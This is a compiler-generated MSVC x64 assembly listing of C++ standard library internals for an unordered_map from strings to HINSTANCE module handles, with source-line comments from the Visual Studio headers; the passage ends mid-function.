; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
;	COMDAT ?_Bump_erased@_Range_eraser@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEAAXXZ
_TEXT	SEGMENT
this$ = 48
?_Bump_erased@_Range_eraser@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEAAXXZ PROC ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Range_eraser::_Bump_erased, COMDAT

; 1005 :         void _Bump_erased() noexcept {

$LN114:
	mov	QWORD PTR [rsp+16], rbx
	push	rdi
	sub	rsp, 32					; 00000020H

; 1006 :             const auto _Oldnext = _Next;

	mov	rbx, QWORD PTR [rcx+16]
	mov	rdi, rcx

; 1007 :             _Next               = _Oldnext->_Next;

	mov	rax, QWORD PTR [rbx]
	mov	QWORD PTR [rcx+16], rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	mov	rdx, QWORD PTR [rbx+40]
	cmp	rdx, 15

; 4868 :         if (_My_data._Large_mode_engaged()) {

	jbe	SHORT $LN38@Bump_erase
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	mov	rcx, QWORD PTR [rbx+16]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2643 :         _Al.deallocate(_Old_ptr, _Capacity + 1); // +1 for null terminator

	inc	rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN52@Bump_erase

; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	r8, QWORD PTR [rcx-8]
	add	rdx, 39					; 00000027H

; 175  : 
; 176  :     // If the following asserts, it likely means that we are performing
; 177  :     // an aligned delete on memory coming from an unaligned allocation.
; 178  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 179  : 
; 180  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 181  :     // in range [_Min_back_shift, _Non_user_size]
; 182  : #ifdef _DEBUG
; 183  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 184  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 185  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 186  : #endif // ^^^ !defined(_DEBUG) ^^^
; 187  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

	sub	rcx, r8

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	lea	rax, QWORD PTR [rcx-8]
	cmp	rax, 31
	ja	SHORT $LN49@Bump_erase

; 189  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

	mov	rcx, r8
$LN52@Bump_erase:

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
$LN38@Bump_erase:
	mov	edx, 56					; 00000038H
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4875 :         _My_data._Mysize = 0;

	mov	QWORD PTR [rbx+32], 0
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 258  :         ::operator delete(_Ptr, _Bytes);

	mov	rcx, rbx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4876 :         _My_data._Myres  = _Small_string_capacity;

	mov	QWORD PTR [rbx+40], 15

; 4877 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 4878 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

	mov	BYTE PTR [rbx+16], 0
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 1009 :             --_List._Mypair._Myval2._Mysize;

	mov	rax, QWORD PTR [rdi]

; 1010 :         }

	mov	rbx, QWORD PTR [rsp+56]
	dec	QWORD PTR [rax+8]
	add	rsp, 32					; 00000020H
	pop	rdi
	ret	0
$LN49@Bump_erase:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN111@Bump_erase:
?_Bump_erased@_Range_eraser@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEAAXXZ ENDP ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Range_eraser::_Bump_erased
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
;	COMDAT ??0_Range_eraser@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEAA@AEAV?$list@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@2@QEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@2@@Z
_TEXT	SEGMENT
this$ = 8
_List_$ = 16
_First_$ = 24
??0_Range_eraser@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEAA@AEAV?$list@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@2@QEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@2@@Z PROC ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Range_eraser::_Range_eraser, COMDAT

; 1003 :             : _List(_List_), _Predecessor(_First_->_Prev), _Next(_First_) {}

	mov	QWORD PTR [rcx], rdx
	mov	rax, QWORD PTR [r8+8]
	mov	QWORD PTR [rcx+8], rax
	mov	rax, rcx
	mov	QWORD PTR [rcx+16], r8
	ret	0
??0_Range_eraser@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEAA@AEAV?$list@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@2@QEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@2@@Z ENDP ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Range_eraser::_Range_eraser
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
;	COMDAT ?_Orphan_non_end@?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@QEAAXXZ
_TEXT	SEGMENT
this$dead$ = 8
?_Orphan_non_end@?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@QEAAXXZ PROC ; std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >::_Orphan_non_end, COMDAT

; 377  : #if _ITERATOR_DEBUG_LEVEL == 2
; 378  :         _Lockit _Lock(_LOCK_DEBUG);
; 379  :         _Iterator_base12** _Pnext = &this->_Myproxy->_Myfirstiter;
; 380  :         const auto _Head          = _Myhead;
; 381  :         while (*_Pnext) {
; 382  :             _Iterator_base12** _Pnextnext = &(*_Pnext)->_Mynextiter;
; 383  :             if (static_cast<_List_const_iterator<_List_val>&>(**_Pnext)._Ptr == _Head) { // iterator is end(), move on
; 384  :                 _Pnext = _Pnextnext;
; 385  :             } else { // orphan the iterator
; 386  :                 (*_Pnext)->_Myproxy = nullptr;
; 387  :                 *_Pnext             = *_Pnextnext;
; 388  :             }
; 389  :         }
; 390  : #endif // _ITERATOR_DEBUG_LEVEL == 2
; 391  :     }

	ret	0
?_Orphan_non_end@?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@QEAAXXZ ENDP ; std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >::_Orphan_non_end
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
;	COMDAT ??$?8DU?$char_traits@D@std@@V?$allocator@D@1@@std@@YA_NAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@0@Z
_TEXT	SEGMENT
_Left$ = 48
_Right$ = 56
??$?8DU?$char_traits@D@std@@V?$allocator@D@1@@std@@YA_NAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@0@Z PROC ; std::operator==<char,std::char_traits<char>,std::allocator<char> >, COMDAT

; 5044 :     const basic_string<_Elem, _Traits, _Alloc>& _Left, const basic_string<_Elem, _Traits, _Alloc>& _Right) noexcept {

$LN31:
	sub	rsp, 40					; 00000028H

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	QWORD PTR [rdx+24], 15

; 4633 :         return _Traits_equal<_Traits>(_Mypair._Myval2._Myptr(), _Mypair._Myval2._Mysize,

	mov	rax, QWORD PTR [rdx+16]

; 2236 :         if (_Large_mode_engaged()) {

	jbe	SHORT $LN8@operator

; 2237 :             _Result = _Unfancy(_Bx._Ptr);

	mov	rdx, QWORD PTR [rdx]
$LN8@operator:

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	QWORD PTR [rcx+24], 15

; 4633 :         return _Traits_equal<_Traits>(_Mypair._Myval2._Myptr(), _Mypair._Myval2._Mysize,

	mov	r8, QWORD PTR [rcx+16]

; 2236 :         if (_Large_mode_engaged()) {

	jbe	SHORT $LN15@operator

; 2237 :             _Result = _Unfancy(_Bx._Ptr);

	mov	rcx, QWORD PTR [rcx]
$LN15@operator:

; 546  :     return _Left_size == _Right_size && _Traits::compare(_Left, _Right, _Left_size) == 0;

	cmp	r8, rax
	jne	SHORT $LN23@operator

; 379  :         return __builtin_memcmp(_First1, _First2, _Count);

	call	memcmp

; 546  :     return _Left_size == _Right_size && _Traits::compare(_Left, _Right, _Left_size) == 0;

	test	eax, eax
	jne	SHORT $LN23@operator

; 5045 :     return _Left._Equal(_Right);

	mov	al, 1

; 5046 : }

	add	rsp, 40					; 00000028H
	ret	0
$LN23@operator:

; 5045 :     return _Left._Equal(_Right);

	xor	al, al

; 5046 : }

	add	rsp, 40					; 00000028H
	ret	0
??$?8DU?$char_traits@D@std@@V?$allocator@D@1@@std@@YA_NAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@0@Z ENDP ; std::operator==<char,std::char_traits<char>,std::allocator<char> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ??$?0U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@QEAA@AEBV?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@1@@Z
_TEXT	SEGMENT
this$ = 8
__formal$dead$ = 16
??$?0U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@QEAA@AEBV?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@1@@Z PROC ; std::allocator<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > >::allocator<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > ><std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >, COMDAT

; 943  :     constexpr allocator(const allocator<_Other>&) noexcept {}

	mov	rax, rcx
	ret	0
??$?0U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@QEAA@AEBV?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@1@@Z ENDP ; std::allocator<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > >::allocator<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > ><std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\utility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
;	COMDAT ??$?0U?$pair@PEBDPEAUHINSTANCE__@@@std@@@?$_List_node_emplace_op2@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@std@@QEAA@AEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@$$QEAU?$pair@PEBDPEAUHINSTANCE__@@@1@@Z
_TEXT	SEGMENT
this$ = 48
_Al_$ = 56
<_Vals_0>$ = 64
??$?0U?$pair@PEBDPEAUHINSTANCE__@@@std@@@?$_List_node_emplace_op2@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@std@@QEAA@AEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@$$QEAU?$pair@PEBDPEAUHINSTANCE__@@@1@@Z PROC ; std::_List_node_emplace_op2<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> > >::_List_node_emplace_op2<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> > ><std::pair<char const *,HINSTANCE__ *> >, COMDAT

; 583  :     explicit _List_node_emplace_op2(_Alnode& _Al_, _Valtys&&... _Vals) : _Alloc_construct_ptr<_Alnode>(_Al_) {

$LN45:
	mov	QWORD PTR [rsp+16], rbx
	mov	QWORD PTR [rsp+24], rsi
	mov	QWORD PTR [rsp+8], rcx
	push	rdi
	sub	rsp, 32					; 00000020H
	mov	rdi, r8
	mov	rsi, rcx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 1125 :     _CONSTEXPR20 explicit _Alloc_construct_ptr(_Alloc& _Al_) : _Al(_Al_), _Ptr(nullptr) {}

	mov	QWORD PTR [rcx], rdx
	xor	eax, eax

; 1132 :         _Ptr = nullptr; // if allocate throws, prevents double-free

	mov	QWORD PTR [rcx+8], rax

; 1133 :         _Ptr = _Al.allocate(1);

	mov	ecx, 56					; 00000038H
	call	??2@YAPEAX_K@Z				; operator new
	mov	QWORD PTR [rsi+8], rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list

; 585  :         _Alnode_traits::construct(this->_Al, _STD addressof(this->_Ptr->_Myval), _STD forward<_Valtys>(_Vals)...);

	lea	rbx, QWORD PTR [rax+16]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\utility

; 276  :         : first(_STD forward<_Other1>(_Right.first)), second(_STD forward<_Other2>(_Right.second)) {}

	mov	rdx, QWORD PTR [rdi]
	mov	rcx, rbx
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
	mov	rax, QWORD PTR [rdi+8]
	mov	QWORD PTR [rbx+32], rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list

; 586  :     }

	mov	rax, rsi
	mov	rbx, QWORD PTR [rsp+56]
	mov	rsi, QWORD PTR [rsp+64]
	add	rsp, 32					; 00000020H
	pop	rdi
	ret	0
??$?0U?$pair@PEBDPEAUHINSTANCE__@@@std@@@?$_List_node_emplace_op2@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@std@@QEAA@AEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@$$QEAU?$pair@PEBDPEAUHINSTANCE__@@@1@@Z ENDP ; std::_List_node_emplace_op2<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> > >::_List_node_emplace_op2<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> > ><std::pair<char const *,HINSTANCE__ *> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
this$ = 48
_Al_$ = 56
<_Vals_0>$ = 64
?dtor$0@?0???$?0U?$pair@PEBDPEAUHINSTANCE__@@@std@@@?$_List_node_emplace_op2@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@std@@QEAA@AEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@$$QEAU?$pair@PEBDPEAUHINSTANCE__@@@1@@Z@4HA PROC ; `std::_List_node_emplace_op2<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> > >::_List_node_emplace_op2<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> > ><std::pair<char const *,HINSTANCE__ *> >'::`1'::dtor$0
	mov	rcx, QWORD PTR this$[rdx]
	jmp	??1?$_Alloc_construct_ptr@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@std@@QEAA@XZ ; std::_Alloc_construct_ptr<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> > >::~_Alloc_construct_ptr<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> > >
?dtor$0@?0???$?0U?$pair@PEBDPEAUHINSTANCE__@@@std@@@?$_List_node_emplace_op2@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@std@@QEAA@AEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@$$QEAU?$pair@PEBDPEAUHINSTANCE__@@@1@@Z@4HA ENDP ; `std::_List_node_emplace_op2<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> > >::_List_node_emplace_op2<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> > ><std::pair<char const *,HINSTANCE__ *> >'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\utility
;	COMDAT ??$?0V?$_List_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@_N$0A@@?$pair@V?$_List_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@_N@std@@QEAA@$$QEAV?$_List_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@1@$$QEA_N@Z
_TEXT	SEGMENT
this$ = 8
_Val1$ = 16
_Val2$ = 24
